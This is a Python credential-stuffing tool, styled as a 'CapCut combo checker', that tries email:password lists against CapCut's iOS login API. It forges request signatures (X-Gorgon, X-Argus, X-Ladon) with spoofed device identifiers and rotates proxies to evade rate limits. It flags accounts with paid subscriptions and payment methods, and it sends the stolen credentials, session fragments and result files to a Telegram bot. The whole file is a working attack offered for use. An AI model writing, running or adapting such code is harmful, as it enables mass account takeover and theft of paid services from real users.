import os, sys, json, time, random, uuid, hashlib, base64, threading, struct
from concurrent.futures import ThreadPoolExecutor, as_completed
from curl_cffi import requests as creq
from rich.console import Console, Group
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, MofNCompleteColumn
from rich.prompt import Prompt
from rich.text import Text
from rich.align import Align
from rich.layout import Layout
from rich.live import Live
from rich import box

console = Console()

C1 = "bold #00f2ea"
C2 = "bold #ff0050"
C3 = "bold #06b6d4"
CG = "bold #10b981"
CF = "bold #38bdf8"
CR = "bold #ef4444"
CD = "dim #64748b"

BANNER = r"""
 ██████╗ █████╗ ██████╗  ██████╗██╗   ██╗████████╗
██╔════╝██╔══██╗██╔══██╗██╔════╝██║   ██║╚══██╔══╝
██║     ███████║██████╔╝██║     ██║   ██║   ██║
██║     ██╔══██║██╔═══╝ ██║     ██║   ██║   ██║
╚██████╗██║  ██║██║     ╚██████╗╚██████╔╝   ██║
 ╚═════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═════╝    ╚═╝
"""

def header_panel():
    console.print(Text(BANNER, style="bold #00f2ea"), justify="center")
    title = Text()
    title.append("CAPCUT", style="bold #00f2ea")
    title.append(" · ", style="dim")
    title.append("COMBO", style="bold #ff0050")
    title.append(" · ", style="dim")
    title.append("CHECKER", style="bold #06b6d4")
    console.print(Align.center(title))
    console.print(Align.center(Text("passport-api-va.capcutapi.com · ios", style=CD)))
    console.print(Align.center(Text("~ by @Tbbrobin ~", style="italic #00f2ea")))
    console.print()

# ============ CONSTANTS ============
SIGN_SALT  = "a4d3d6a2b1e2c5f6"
LICENSE_ID = 1611921764
LOAD_NUM   = 0x0000000000000001
SM4_KEY    = bytes.fromhex("0e6339cf17b28cf0c6d3a09b83f6ba50")
SM4_IV     = bytes.fromhex("de1d2a94b56d4fa5d43cf78bb1c8a56f")
GORGON_SCRAMBLE = [
    0xDF, 0x77, 0xB9, 0x88, 0x95, 0x18, 0x2E, 0xB1,
    0xFF, 0x9C, 0xAB, 0x2C, 0xF7, 0xCA, 0x35, 0xCE,
]

LOGIN_URL = ("https://passport-api-va.capcutapi.com/passport/email/login/"
             "?passport-sdk-version=6034190")
CAPTURE_URL = "https://commerce-api-va.capcut.com/commerce/v3/trade/subscription_infos"

# ============ TELEGRAM ============
TG_TOKEN = ""
TG_CHAT_ID = ""
TG_API = "https://api.telegram.org/bot{token}/{method}"

def tg_api(method, payload, retries=3):
    if not TG_TOKEN:
        return None
    url = TG_API.format(token=TG_TOKEN, method=method)
    for attempt in range(retries):
        try:
            r = creq.post(url, json=payload, timeout=20, impersonate="chrome124")
            if r.status_code == 200:
                try:
                    return r.json()
                except Exception:
                    return {"ok": True}
            if r.status_code == 429:
                time.sleep(2 + attempt * 2)
                continue
        except Exception:
            time.sleep(1 + attempt)
    return None

def tg_send_html(text):
    return tg_api("sendMessage", {
        "chat_id": TG_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    })

def tg_send_photo(photo_url, caption):
    return tg_api("sendPhoto", {
        "chat_id": TG_CHAT_ID,
        "photo": photo_url,
        "caption": caption,
        "parse_mode": "HTML",
    })

def tg_send_document(filename, content_bytes, caption=""):
    if not TG_TOKEN or not TG_CHAT_ID:
        return None
    url = TG_API.format(token=TG_TOKEN, method="sendDocument")
    try:
        files = {"document": (filename, content_bytes)}
        data = {"chat_id": TG_CHAT_ID, "caption": caption, "parse_mode": "HTML"}
        r = creq.post(url, data=data, files=files, timeout=40, impersonate="chrome124")
        return r.status_code == 200
    except Exception:
        return False

def esc(s):
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def tg_hit_card(email, password, prof, kind="HIT"):
    line = "━━━━━━━━━━━━━━━━━━━━"
    if kind == "HIT":
        title = "🔥 <b>CAPCUT · VIP HIT</b> 🔥"
        head_icon = "💎"
        plan  = prof.get("plan", "-") or "-"
        pay   = prof.get("payment", "-") or "-"
    else:
        title = "✅ <b>CAPCUT · FREE ACCOUNT</b> ✅"
        head_icon = "🎁"
        plan  = "Free"
        pay   = "-"

    session = prof.get("session", "-") or "-"
    uid     = prof.get("uid", "-") or "-"

    text = (
        f"<b>{line}</b>\n"
        f"{head_icon} {title} {head_icon}\n"
        f"<b>{line}</b>\n\n"
        f"📧 <b>Email:</b> <code>{esc(email)}</code>\n"
        f"🔑 <b>Password:</b> <code>{esc(password)}</code>\n\n"
        f"<b>{line}</b>\n"
        f"👑 <b>Plan:</b> <b>{esc(plan)}</b>\n"
        f"💳 <b>Payment:</b> {esc(pay)}\n"
        f"🔐 <b>Session:</b> <code>{esc(session)}</code>\n"
        f"🆔 <b>UID:</b> <code>{esc(uid)}</code>\n"
        f"<b>{line}</b>\n\n"
        f"⚡ <i>CapCut Checker · @Aegris</i>"
    )
    return tg_send_html(text)

def tg_startup_card():
    line = "━━━━━━━━━━━━━━━━━━━━"
    text = (
        f"<b>{line}</b>\n"
        f"🤖 <b>CAPCUT CHECKER · ONLINE</b> 🤖\n"
        f"<b>{line}</b>\n\n"
        f"✅ <b>Status:</b> Connected\n"
        f"📡 <b>Mode:</b> Live Hit Feed\n"
        f"🎯 <b>Target:</b> passport-api-va.capcutapi.com\n\n"
        f"<b>{line}</b>\n"
        f"⚡ <i>by @Aegris</i>"
    )
    return tg_send_html(text)

def tg_final_report(stats, elapsed, ts):
    line = "━━━━━━━━━━━━━━━━━━━━"
    text = (
        f"<b>{line}</b>\n"
        f"📊 <b>SCAN COMPLETE</b> 📊\n"
        f"<b>{line}</b>\n\n"
        f"⏱ <b>Duration:</b> {int(elapsed)}s\n"
        f"📦 <b>Total:</b> {stats['total']}\n\n"
        f"<b>{line}</b>\n"
        f"🔥 <b>HIT:</b> {stats['hit']}\n"
        f"✅ <b>FREE:</b> {stats['free']}\n"
        f"❌ <b>BAD:</b> {stats['invalid']}\n"
        f"🔁 <b>RETRY:</b> {stats['retry']}\n"
        f"⚠️ <b>ERR:</b> {stats['err']}\n"
        f"<b>{line}</b>\n\n"
        f"⚡ <i>CapCut Checker · @Tbbrobin</i>"
    )
    return tg_send_html(text)

# ============ SM4 pure python ============
SBOX = [
    0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05,
    0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99,
    0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62,
    0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6,
    0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8,
    0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35,
    0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87,
    0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e,
    0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1,
    0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3,
    0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f,
    0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51,
    0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8,
    0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0,
    0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84,
    0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48,
]
FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc]
CK = [
    0x00070e15,0x1c232a31,0x383f464d,0x545b6269,0x70777e85,0x8c939aa1,0xa8afb6bd,
    0xc4cbd2d9,0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249,0x50575e65,0x6c737a81,
    0x888f969d,0xa4abb2b9,0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229,0x30373e45,
    0x4c535a61,0x686f767d,0x848b9299,0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209,
    0x10171e25,0x2c333a41,0x484f565d,0x646b7279,
]

def _rotl(x, n): return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF

def _sm4_tau(a):
    b = 0
    for i in range(4):
        b |= SBOX[(a >> (i * 8)) & 0xFF] << (i * 8)
    return b

def _sm4_t(a):
    b = _sm4_tau(a)
    return b ^ _rotl(b, 2) ^ _rotl(b, 10) ^ _rotl(b, 18) ^ _rotl(b, 24)

def _sm4_t_prime(a):
    b = _sm4_tau(a)
    return b ^ _rotl(b, 13) ^ _rotl(b, 23)

def _sm4_key_schedule(key):
    mk = [struct.unpack(">I", key[i*4:(i+1)*4])[0] for i in range(4)]
    k = [mk[i] ^ FK[i] for i in range(4)]
    rk = []
    for i in range(32):
        k.append(k[i] ^ _sm4_t_prime(k[i+1] ^ k[i+2] ^ k[i+3] ^ CK[i]))
        rk.append(k[i+4])
    return rk

def sm4_encrypt_block(block, rk):
    x = [struct.unpack(">I", block[i*4:(i+1)*4])[0] for i in range(4)]
    for i in range(32):
        x.append(x[i] ^ _sm4_t(x[i+1] ^ x[i+2] ^ x[i+3] ^ rk[i]))
    return struct.pack(">IIII", x[35], x[34], x[33], x[32])

def sm4_cbc_encrypt(plain, key, iv):
    rk = _sm4_key_schedule(key)
    pad = 16 - (len(plain) % 16)
    plain = plain + bytes([pad] * pad)
    out = b""
    prev = iv
    for i in range(0, len(plain), 16):
        blk = bytes(a ^ b for a, b in zip(plain[i:i+16], prev))
        enc = sm4_encrypt_block(blk, rk)
        out += enc
        prev = enc
    return out

# ============ helpers ============
def md5_hex(s):
    return hashlib.md5(str(s).encode("utf-8")).digest().hex()

def md5_buf(s):
    return hashlib.md5(str(s).encode("utf-8")).digest()

def md5_upper(s):
    return md5_hex(s).upper()

def b64(s):
    return base64.b64encode(str(s).encode("utf-8")).decode()

def rand_hex(n):
    return os.urandom(n).hex()

def uuidv4():
    return str(uuid.uuid4())

def u32be(n):
    return struct.pack(">I", n & 0xFFFFFFFF)

def u64be(n):
    return struct.pack(">Q", n & 0xFFFFFFFFFFFFFFFF)

def num_id(length=19):
    s = str(1 + random.randint(0, 8))
    for _ in range(length - 1):
        s += str(random.randint(0, 9))
    return s

def trace_id():
    return f"00-{rand_hex(16)}-{rand_hex(8)}-01"

def xor5_hex(plain):
    return bytes(b ^ 0x05 for b in str(plain).encode("utf-8")).hex()

# ============ device ============
DEVICE = {
    "aid": "3006", "app_name": "vicut", "app_package": "com.lemon.lvoverseas",
    "appvr": "13.9.0", "version_code": "13900100", "update_version_code": "13900100",
    "manifest_version_code": "13900100", "app_sdk_version": "181.0.0",
    "channel": "App Store", "device_platform": "iphone", "os": "ios",
    "os_version": "18.5", "os_api": "18", "device_type": "iPhone17,1",
    "device_brand": "Apple", "resolution": "1320*2868", "dpi": "460",
    "language": "en", "app_language": "en", "region": "US", "app_region": "US",
    "sys_region": "US", "timezone_name": "America/New_York",
    "carrier_region": "US", "mcc_mnc": "310260", "store_country_code": "us",
    "ac": "wifi", "ssmix": "a",
}

def build_login(email, password):
    device_time = int(time.time())
    rticket_ms  = int(time.time() * 1000)
    khronos     = device_time + 13

    did  = num_id(19)
    tdid = did
    tiid = num_id(19)
    iid  = tiid
    cdid = uuidv4()
    idfv = uuidv4().upper()
    csrf = rand_hex(16)

    entries = [
        ("password", xor5_hex(password)),
        ("account_sdk_source", "app"),
        ("email", xor5_hex(email)),
        ("mix_mode", "1"),
        ("iid", iid), ("device_id", did), ("ac", DEVICE["ac"]),
        ("channel", DEVICE["channel"]), ("aid", DEVICE["aid"]),
        ("app_name", DEVICE["app_name"]), ("version_code", DEVICE["version_code"]),
        ("version_name", DEVICE["appvr"]), ("device_platform", DEVICE["device_platform"]),
        ("os", DEVICE["os"]), ("ssmix", DEVICE["ssmix"]),
        ("device_type", DEVICE["device_type"]), ("device_brand", DEVICE["device_brand"]),
        ("language", DEVICE["language"]), ("os_api", DEVICE["os_api"]),
        ("os_version", DEVICE["os_version"]), ("idfv", idfv),
        ("manifest_version_code", DEVICE["manifest_version_code"]),
        ("resolution", DEVICE["resolution"]), ("dpi", DEVICE["dpi"]),
        ("update_version_code", DEVICE["update_version_code"]),
        ("_rticket", str(rticket_ms)), ("carrier_region", DEVICE["carrier_region"]),
        ("mcc_mnc", DEVICE["mcc_mnc"]), ("region", DEVICE["region"]),
        ("cdid", cdid),
    ]
    payload = "&".join(f"{k}={v}" for k, v in entries)

    header_content = f"/passport/email/login/|0|{DEVICE['appvr']}|{device_time}|{tdid}"
    sign    = md5_hex(f"{header_content}|{device_time}|{tdid}|{SIGN_SALT}")
    hdr_sign = md5_hex(f"{tdid}|{tiid}|{device_time}|{SIGN_SALT}")
    x_ss_stub = md5_upper(payload)

    gorgon_fp = md5_buf("")[:4] + md5_buf(payload)[:4] + md5_buf("")[:4] + md5_buf("")[:4]
    gorgon_kh = u32be(khronos)
    gorgon_raw = gorgon_fp + gorgon_kh
    gorgon_out = bytearray(20)
    t_low = khronos & 0xFF
    for i in range(20):
        b = gorgon_raw[i]
        b = ((b << 3) | (b >> 5)) & 0xFF
        b ^= GORGON_SCRAMBLE[i & 0x0F]
        b ^= t_low
        gorgon_out[i] = b
    gorgon_header = struct.pack(">HHH", 0x8404, 0x80b7, 0x0001)
    x_gorgon = (gorgon_header + bytes(gorgon_out)).hex()

    ladon_plain = u32be(khronos) + u32be(LICENSE_ID) + u64be(LOAD_NUM) + os.urandom(8)
    ladon_cipher = sm4_cbc_encrypt(ladon_plain, SM4_KEY, SM4_IV)
    x_ladon = base64.b64encode(ladon_cipher + os.urandom(4)).decode().rstrip("=")

    idfv_hex = idfv.replace("-", "")[:16]
    argus_plain = (
        b"ARGS" + u32be(0x00030001) + u32be(khronos) + u32be(int(DEVICE["aid"]))
        + u32be(LICENSE_ID) + u32be(0x00000001) + u64be(0)
        + md5_buf("/passport/email/login/")[:8] + md5_buf(payload)
        + md5_buf(did)[:8] + md5_buf(iid)[:8] + bytes.fromhex(idfv_hex)
        + md5_buf(DEVICE["aid"])[:8]
        + os.urandom(128) + os.urandom(128) + os.urandom(64) + os.urandom(48)
    )
    argus_cipher = sm4_cbc_encrypt(argus_plain, SM4_KEY, SM4_IV)
    x_argus = base64.b64encode(argus_cipher + os.urandom(2)).decode()

    headers = {
        "Appvr": DEVICE["appvr"], "Vc": DEVICE["version_code"],
        "Device-Time": str(device_time), "Tdid": tdid, "Sign-Ver": "1",
        "Sign": sign, "App-Sdk-Version": DEVICE["app_sdk_version"],
        "Appid": DEVICE["aid"], "Header-Content": header_content,
        "Cache-Control": "no-cache", "Sysvr": DEVICE["os_api"],
        "Ch": DEVICE["channel"], "Uid": "0", "Did": idfv,
        "Model": b64(DEVICE["device_type"]), "Manu": b64(DEVICE["device_brand"]),
        "Gpurender": b64("Apple GPU"), "Hdr-Tdid": tdid, "Hdr-Tiid": tiid,
        "Hdr-Device-Time": str(device_time), "Hdr-Sign": hdr_sign,
        "Hdr-Sign-Ver": "1", "X-Tt-Passport-Csrf-Token": csrf,
        "App_language": DEVICE["app_language"], "App_region": DEVICE["app_region"],
        "Sys_region": DEVICE["sys_region"], "Timezone_name": DEVICE["timezone_name"],
        "Carrier_region": DEVICE["carrier_region"],
        "X-Ss-Req-Ticket": str(rticket_ms),
        "X-Vc-Bdturing-Sdk-Version": "2.3.10.i18n",
        "Sdk-Version": "2", "X-Tt-Token": "",
        "Passport-Sdk-Version": "-1", "X-Tt-Bypass-Dp": "1",
        "Region": DEVICE["region"], "X-Tt-Pba-Enable": "1",
        "Store-Country-Code": DEVICE["store_country_code"],
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Ss-Stub": x_ss_stub, "X-Tt-Trace-Id": trace_id(),
        "User-Agent": f"CapCut/{DEVICE['appvr']} CFNetwork/3850.101.20 Darwin/24.7.0",
        "Accept-Encoding": "gzip, deflate, br",
        "X-Argus": x_argus, "X-Gorgon": x_gorgon,
        "X-Khronos": str(khronos), "X-Ladon": x_ladon,
    }

    url = (LOGIN_URL
           + f"&iid={iid}&device_id={did}&ac=wifi&channel=App%20Store"
           + "&aid=3006&app_name=vicut&version_code=13900100&version_name=13.9.0"
           + "&device_platform=iphone&os=ios&ssmix=a&device_type=iPhone17%2C1"
           + "&device_brand=Apple&language=en&os_api=18&os_version=18.5"
           + f"&idfv={idfv}&manifest_version_code=13900100"
           + "&resolution=1320*2868&dpi=460&update_version_code=13900100"
           + f"&_rticket={rticket_ms}&carrier_region=US&mcc_mnc=310260"
           + f"&region=US&cdid={cdid}&user_type=personal_user&use_store_region_cookie=1")

    return url, headers, payload

# ============ CHECK ============
def check_capcut(email, password, proxy=None):
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        url, headers, payload = build_login(email, password)
        s = creq.Session(impersonate="chrome124", proxies=proxies)

        r = s.post(url, data=payload, headers=headers, timeout=25)
        text = r.text

        if any(x in text for x in [
            "Account doesn't exist",
            "Incorrect account or password",
            "Username or password doesn't match",
            "login_failed",
            "account_not_exist",
        ]):
            return "INVALID", {"reason": "bad credentials"}

        if "Maximum number of attempts" in text:
            return "RETRY", {"reason": "max attempts"}

        if "Account temporarily locked" in text:
            return "BAN", {"reason": "locked"}

        if r.status_code in (403, 429):
            return "RETRY", {"reason": f"http_{r.status_code}"}

        if '"session_key":"' in text:
            info = {"plan": "-", "payment": "-", "session": "-", "uid": "-"}
            try:
                j = r.json()
                data = j.get("data") or {}
                info["session"] = (data.get("session_key") or "-")[:16] + "..."
                uid = data.get("user_id") or data.get("uid") or (data.get("user") or {}).get("uid_str")
                info["uid"] = str(uid) if uid else "-"
            except Exception:
                pass

            # VIP check
            try:
                r2 = s.post(CAPTURE_URL,
                    json={"scene": ["vip", "workspace"], "app_id": 3006,
                          "vip_levels": ["vip", "ultra"]},
                    headers={**headers, "Content-Type": "application/json"},
                    timeout=20)
                t2 = r2.text
                if '"is_vip":true' in t2 or '"is_vip": true' in t2:
                    plan = "-"
                    pay = "-"
                    try:
                        if '"sku_name":"' in t2:
                            plan = t2.split('"sku_name":"', 1)[1].split('"', 1)[0]
                        if '"payment_method":"' in t2:
                            pay = t2.split('"payment_method":"', 1)[1].split('"', 1)[0]
                    except Exception:
                        pass
                    info["plan"] = plan
                    info["payment"] = pay
                    return "HIT", info
                return "FREE", info
            except Exception:
                return "FREE", info

        return "INVALID", {"reason": f"no_match_status_{r.status_code}"}

    except Exception as e:
        return "ERR", {"reason": type(e).__name__}

# ============ PROXY ============
def parse_proxy(line):
    line = line.strip()
    if not line: return None
    if line.startswith(("http://", "https://", "socks4://", "socks5://")):
        return line
    p = line.split(":")
    if len(p) == 4:
        return f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
    if len(p) == 2:
        return f"http://{p[0]}:{p[1]}"
    return None

# ============ UI ============
def stats_panel(st):
    el = time.time() - st["t0"] if st["t0"] else 0
    cpm = int(st["done"] / (el / 60)) if el > 0 else 0
    t = Table.grid(expand=True, padding=(0, 1))
    for _ in range(8):
        t.add_column(justify="center")
    t.add_row(
        Text.assemble(("DONE ", CD), (f"{st['done']}/{st['total']}", "bold white")),
        Text.assemble(("HIT ", CD), (str(st["hit"]), CG)),
        Text.assemble(("FREE ", CD), (str(st["free"]), CF)),
        Text.assemble(("BAD ", CD), (str(st["invalid"]), CR)),
        Text.assemble(("ERR ", CD), (str(st["err"]), "bold #f97316")),
        Text.assemble(("RETRY ", CD), (str(st["retry"]), "bold #a78bfa")),
        Text.assemble(("CPM ", CD), (str(cpm), C3)),
        Text.assemble(("TG ", CD), ("●" if (TG_TOKEN and TG_CHAT_ID) else "○", CG if (TG_TOKEN and TG_CHAT_ID) else CR)),
    )
    return Panel(t, box=box.ROUNDED, border_style="#334155", padding=(0, 1))

def feed_panel(results):
    t = Table(box=box.SIMPLE_HEAD, show_header=True, header_style="bold #00f2ea",
              expand=True, pad_edge=False, show_edge=False)
    t.add_column("#", justify="right", style=CD, width=3)
    t.add_column("COMBO", overflow="fold", style="white")
    t.add_column("ST", justify="center", width=5)
    t.add_column("PLAN", style="white", overflow="fold")
    t.add_column("PAY", style=CD, width=10)
    color = {"HIT": CG, "FREE": CF}
    for i, r in enumerate(results[-15:], 1):
        t.add_row(str(i), r["combo"], Text(r["status"], style=color.get(r["status"], "white")),
                  r.get("plan", "-"), r.get("pay", "-"))
    return Panel(t, title="[bold #06b6d4]◈ FEED [dim](hits+frees)[/dim][/bold #06b6d4]",
                 border_style="#1e293b", box=box.ROUNDED, padding=(0, 1))

# ============ MAIN ============
def main():
    global TG_TOKEN, TG_CHAT_ID

    console.clear()
    header_panel()

    # ===== Telegram setup =====
    console.print(Panel(
        Align.center(Text.assemble(
            ("🔐 ", ""),
            ("TELEGRAM CONFIG", "bold #00f2ea"),
            ("  ·  ", CD),
            ("live hit feed", "dim #94a3b8"),
        )),
        border_style="#06b6d4", box=box.ROUNDED, padding=(0, 2)
    ))

    TG_TOKEN = Prompt.ask(Text.assemble(("  ", ""), ("bot token ", C2))).strip()
    TG_CHAT_ID = Prompt.ask(Text.assemble(("  ", ""), ("chat id   ", C2))).strip()

    tg_ready = False
    if TG_TOKEN and TG_CHAT_ID:
        console.print("  [dim]testing telegram...[/dim]")
        res = tg_startup_card()
        if res and res.get("ok"):
            tg_ready = True
            console.print("  [bold #10b981]✓ telegram connected[/bold #10b981]\n")
        else:
            console.print("  [bold #ef4444]✗ telegram failed — check token/chat id[/bold #ef4444]")
            console.print("  [dim]continuing without telegram...[/dim]\n")
    else:
        console.print("  [yellow]⚠ telegram skipped — hits will NOT be sent[/yellow]\n")

    # ===== input =====
    path = Prompt.ask(Text.assemble(("  ", ""), ("combo file", C2))).strip().strip('"').strip("'")
    if not os.path.isfile(path):
        console.print("  [bold red]file not found[/bold red]"); return

    ppath = Prompt.ask(Text.assemble(("  ", ""), ("proxy file ", C2), ("(skip)", CD)), default="").strip().strip('"').strip("'")
    thr = Prompt.ask(Text.assemble(("  ", ""), ("threads    ", C2), ("[5]", CD)), default="5")
    try: threads = max(1, int(thr))
    except Exception: threads = 5

    combos, seen = [], set()
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or ":" not in line: continue
            if line in seen: continue
            seen.add(line)
            u, _, p = line.partition(":")
            if u.strip() and p.strip():
                combos.append((u.strip(), p.strip()))
    if not combos:
        console.print("  [bold red]no valid combos[/bold red]"); return

    proxies = []
    if ppath and os.path.isfile(ppath):
        proxies = [parse_proxy(l) for l in open(ppath, encoding="utf-8", errors="ignore") if l.strip()]
        proxies = [p for p in proxies if p]

    console.print()
    sm = Table.grid(padding=(0, 2))
    sm.add_column(style=CD); sm.add_column(style="bold white")
    sm.add_row("combos", f"{len(combos):,}")
    sm.add_row("proxies", f"{len(proxies):,}" if proxies else "[yellow]none[/yellow]")
    sm.add_row("threads", str(threads))
    sm.add_row("telegram", "[green]✓ active[/green]" if tg_ready else "[yellow]✗ off[/yellow]")
    console.print(Panel(sm, title="[bold #06b6d4]▸ READY[/bold #06b6d4]",
                        border_style="#06b6d4", box=box.ROUNDED, padding=(0, 2)))
    console.print()

    os.makedirs("output", exist_ok=True)
    ts = time.strftime("%Y%m%d_%H%M%S")
    hits_f = open(f"output/capcut_hits_{ts}.txt", "w", encoding="utf-8")
    free_f = open(f"output/capcut_free_{ts}.txt", "w", encoding="utf-8")
    inv_f  = open(f"output/capcut_invalid_{ts}.txt", "w", encoding="utf-8")

    stats = {"hit": 0, "free": 0, "invalid": 0, "err": 0, "retry": 0, "done": 0, "total": len(combos), "t0": time.time()}
    results = []
    lock = threading.Lock()
    px_i = [0]

    def next_px():
        if not proxies: return None
        with lock:
            p = proxies[px_i[0] % len(proxies)]
            px_i[0] += 1
            return p

    def worker(email, pw):
        proxy = next_px()
        try:
            st, prof = check_capcut(email, pw, proxy)
        except Exception as e:
            st, prof = "ERR", {"reason": f"exc:{type(e).__name__}"}
        with lock:
            stats["done"] += 1
            if st == "HIT":
                stats["hit"] += 1
                hits_f.write(
                    f"{email}:{pw}\nStatus - HIT\nPlan - {prof.get('plan','-')}\n"
                    f"Payment - {prof.get('payment','-')}\nSession - {prof.get('session','-')}\n"
                    f"UID - {prof.get('uid','-')}\n\n")
                hits_f.flush()
                results.append({"combo": f"{email}:{pw}", "status": st,
                                "plan": prof.get("plan","-"), "pay": prof.get("payment","-")})
                if tg_ready:
                    tg_hit_card(email, pw, prof, kind="HIT")
            elif st == "FREE":
                stats["free"] += 1
                free_f.write(
                    f"{email}:{pw}\nStatus - FREE\nSession - {prof.get('session','-')}\n"
                    f"UID - {prof.get('uid','-')}\n\n")
                free_f.flush()
                results.append({"combo": f"{email}:{pw}", "status": st, "plan": "-", "pay": "-"})
                if tg_ready:
                    tg_hit_card(email, pw, prof, kind="FREE")
            elif st == "INVALID":
                stats["invalid"] += 1
                inv_f.write(f"{email}:{pw}\n"); inv_f.flush()
            elif st == "RETRY":
                stats["retry"] += 1
            else:
                stats["err"] += 1
        return st, prof

    progress = Progress(
        SpinnerColumn(style=C1),
        TextColumn("[bold #00f2ea]{task.description}"),
        BarColumn(bar_width=None, style="#1e293b", complete_style="#00f2ea", finished_style="#10b981"),
        MofNCompleteColumn(),
        TimeElapsedColumn(),
        console=console, expand=True,
    )
    task = progress.add_task("checking", total=len(combos))

    layout = Layout()
    layout.split_column(
        Layout(name="stats", size=3),
        Layout(name="progress", size=3),
        Layout(name="feed", ratio=1),
    )

    with Live(layout, console=console, refresh_per_second=8, screen=False) as live:
        def refresh():
            layout["stats"].update(stats_panel(stats))
            layout["progress"].update(progress)
            layout["feed"].update(feed_panel(results))

        refresh()
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futs = {ex.submit(worker, u, p): (u, p) for u, p in combos}
            for f in as_completed(futs):
                try: st, prof = f.result()
                except Exception: st, prof = "ERR", {}
                progress.advance(task)
                if st == "HIT":
                    console.print(f"  [bold #10b981]◉ HIT[/bold #10b981]  [white]{prof.get('plan','-')}[/white]  [dim]{prof.get('payment','-')}[/dim]")
                elif st == "FREE":
                    console.print(f"  [bold #38bdf8]◉ FREE[/bold #38bdf8] [dim]no sub[/dim]")
                refresh()

    hits_f.close(); free_f.close(); inv_f.close()

    elapsed = time.time() - stats["t0"]

    # ===== final telegram report + files =====
    if tg_ready:
        try:
            tg_final_report(stats, elapsed, ts)
            if stats["hit"] > 0:
                with open(f"output/capcut_hits_{ts}.txt", "rb") as fh:
                    tg_send_document(f"hits_{ts}.txt", fh.read(),
                                     f"🔥 <b>{stats['hit']} HIT</b> · CapCut · @Aegris")
            if stats["free"] > 0:
                with open(f"output/capcut_free_{ts}.txt", "rb") as fh:
                    tg_send_document(f"free_{ts}.txt", fh.read(),
                                     f"✅ <b>{stats['free']} FREE</b> · CapCut · @Aegris")
        except Exception:
            pass

    console.print()
    fin = Table.grid(padding=(0, 3))
    for _ in range(5): fin.add_column(justify="center")
    fin.add_row(
        Text.assemble(("HIT ", CD), (str(stats["hit"]), CG)),
        Text.assemble(("FREE ", CD), (str(stats["free"]), CF)),
        Text.assemble(("BAD ", CD), (str(stats["invalid"]), CR)),
        Text.assemble(("RETRY ", CD), (str(stats["retry"]), "bold #a78bfa")),
        Text.assemble(("ERR ", CD), (str(stats["err"]), "bold #f97316")),
    )
    console.print(Panel(fin, title=f"[bold #00f2ea]✓ COMPLETE  ·  {int(elapsed)}s[/bold #00f2ea]",
                        border_style="#00f2ea", box=box.HEAVY, padding=(0, 2)))
    console.print(f"  [dim]→ output/capcut_hits_{ts}.txt[/dim]")
    console.print(f"  [dim]→ output/capcut_free_{ts}.txt[/dim]")
    console.print(f"  [dim]→ output/capcut_invalid_{ts}.txt[/dim]\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[bold red]interrupted[/bold red]")
        sys.exit(0)